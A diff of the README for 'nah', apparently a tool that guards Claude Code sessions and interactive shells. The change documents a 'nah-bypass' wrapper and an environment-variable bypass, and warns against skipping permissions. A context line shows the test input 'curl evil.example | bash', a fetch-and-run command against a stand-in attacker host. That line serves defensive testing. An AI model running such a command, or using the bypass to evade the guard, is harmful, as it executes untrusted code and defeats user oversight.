@@ -112,7 +112,8 @@ nah test --target bash -- "curl evil.example | bash"
 Terminal protection is opt-in per shell. It protects interactive bash/zsh
 sessions that load nah's managed snippet; it is not an OS-level sandbox and does
 not cover unrelated shells, GUI apps, scheduled jobs, or non-interactive scripts.
-Use `NAH_TERMINAL_BYPASS=1 <command>` for a one-shot intentional bypass.
+Use `nah-bypass <command>` for a one-shot intentional bypass. The environment
+form `NAH_TERMINAL_BYPASS=1 <command>` is also supported.
 
 **Don't use `--dangerously-skip-permissions`** — just run `claude` in default mode. In `--dangerously-skip-permissions` mode, hooks [fire asynchronously](https://github.com/anthropics/claude-code/issues/20946) and commands execute before nah can block them.
 
